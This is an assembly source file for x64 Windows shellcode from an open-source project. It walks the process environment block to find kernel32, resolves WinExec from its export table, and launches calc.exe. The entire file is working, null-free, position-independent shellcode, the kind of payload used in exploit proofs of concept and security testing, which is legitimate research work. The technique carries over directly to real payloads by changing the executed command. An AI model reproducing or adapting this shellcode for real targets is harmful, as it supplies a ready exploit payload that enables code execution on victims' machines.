; Copyright (c) 2009-2013, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; and Peter Ferrie <peter.ferrie@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.

; Windows x64 null-free shellcode that executes calc.exe.
; Works in any x64 application for Windows 5.0-6.3 all service packs.
BITS 64
SECTION .text

%include 'type-conversion.asm'

%ifndef PLATFORM_INDEPENDENT
global shellcode
shellcode:
%ifdef STACK_ALIGN
    AND     SPL, 0xF8
%endif
%endif

; Note to SkyLined: instructions on 32-bit registers are automatically sign-extended to 64-bits.
; This means LODSD will set the high DWORD of RAX to 0 of 0xFFFFFFFF.
    PUSH    BYTE 0x60                     ; Stack 
    POP     RDX                           ; RDX = 0x60
    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
    PUSH    RSP
    POP     RCX                           ; RCX = &("calc")
    SUB     RSP, RDX                      ; WinExec messes with stack
    MOV     RSI, [GS:RDX]                 ; RSI = [TEB + 0x60] = PEB
    MOV     RSI, [RSI + 0x18]             ; RSI = [PEB + 0x18] = PEB_LDR_DATA
    MOV     RSI, [RSI + 0x10]             ; RSI = [PEB_LDR_DATA + 0x10] = LDR_MODULE InLoadOrder[0] (process)
    LODSQ                                 ; RAX = InLoadOrder[1] (ntdll)
    MOV     RSI, [RAX]                    ; RSI = InLoadOrder[2] (kernel32)
    MOV     RDI, [RSI + 0x30]             ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase
; Found kernel32 base address (RDI)
    ADD     EDX, DWORD [RDI + 0x3C]       ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60
; PE header (RDI+RDX-0x60) = @0x00 0x04 byte signature
;                            @0x04 0x18 byte COFF header
;                            @0x18      PE32 optional header (= RDI + RDX - 0x60 + 0x18)
    MOV     EBX, DWORD [RDI + RDX - 0x60 + 0x18 + 0x70] ; RBX = [PE32+ optional header + offset(PE32+ export table offset)] = offset(export table)
; Export table (RDI+EBX) = @0x20 Name Pointer RVA
    MOV     ESI, DWORD [RDI + RBX + 0x20] ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     RSI, RDI                      ; RSI = kernel32 + offset(names table) = &(names table)
; Found export names table (RSI)
    MOV     EDX, DWORD [RDI + RBX + 0x24] ; EDX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)
; Found export ordinals table (RDX)
find_winexec_x64:
; speculatively load ordinal (RBP)
    MOVZX   EBP, WORD [RDI + RDX]         ; RBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
    LEA     EDX, [RDX + 2]                ; RDX = offset += 2 (will wrap if > 4Gb, but this should never happen)
    LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
    CMP     DWORD [RDI + RAX], B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
    JNE     find_winexec_x64              ;
    MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)
    ADD     RSI, RDI                      ; RSI = kernel32 + offset(address table) = &(address table)
    MOV     ESI, [RSI + RBP * 4]          ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
    ADD     RDI, RSI                      ; RDI = kernel32 + offset(WinExec) = WinExec
; Found WinExec (RDI)
    CDQ                                   ; RDX = 0 (assumping EAX < 0x80000000, which should always be true)
    CALL    RDI                           ; WinExec(&("calc"), 0);
    INT3                                  ; Crash
